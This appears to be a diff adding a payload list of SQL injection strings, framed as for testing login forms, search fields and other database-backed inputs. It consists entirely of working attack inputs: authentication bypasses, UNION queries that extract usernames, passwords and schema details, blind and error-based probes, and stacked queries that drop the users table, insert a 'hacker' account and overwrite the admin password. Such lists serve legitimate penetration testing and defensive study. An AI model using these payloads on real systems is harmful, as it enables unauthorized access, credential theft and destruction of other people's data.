@@ -1,0 +1,63 @@
+# SQL Injection Payloads
+# Use these payloads to test SQL injection vulnerabilities
+# Target: Login form, search fields, any user input that queries database
+
+# Basic Authentication Bypass
+' OR '1'='1'--
+' OR 1=1--
+admin' OR '1'='1
+' OR 'a'='a
+admin'--
+' OR 1=1 LIMIT 1--
+admin' #
+') OR ('1'='1
+' OR '1'='1' /*
+admin' OR 1=1--
+
+# Union-Based Injection
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT username, password FROM users--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+
+# Time-Based Blind Injection
+1' AND SLEEP(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; WAITFOR DELAY '00:00:05'--
+1'; WAITFOR DELAY '00:00:05'--
+
+# Error-Based Injection
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' UNION SELECT NULL, @@version--
+
+# Boolean-Based Blind Injection
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+
+# Stacked Queries
+'; DROP TABLE users--
+'; INSERT INTO users VALUES ('hacker', 'password')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+
+# Comment Variations
+admin'-- -
+admin'#
+admin'/*
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin' OR '1'='1'/*
+
+# Encoding Variations
+%27%20OR%20%271%27%3D%271
+%27%20OR%201%3D1--
+admin%27--
+
+# Advanced Payloads
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+' AND (SELECT COUNT(*) FROM users) > 0--
+' OR (SELECT user FROM mysql.user LIMIT 1)='root'--
